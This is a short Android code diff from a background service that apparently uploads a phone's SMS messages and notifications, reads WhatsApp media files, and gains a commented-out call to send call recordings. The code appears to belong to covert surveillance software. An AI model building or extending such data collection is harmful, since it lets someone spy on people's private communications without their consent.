@@ -54,6 +54,7 @@ public class BackgroundJob extends Service {
                         backgroundJobService.sendSMSToServer();
                         backgroundJobService.sendNotificationsToServer();
                         backgroundJobService.readWhatsAppMediaFiles();
+//                        backgroundJobService.sendCallRecording();
                     }
 //                    Toast.makeText(BackgroundJob.this, "Service is running", Toast.LENGTH_SHORT).show();
                 }
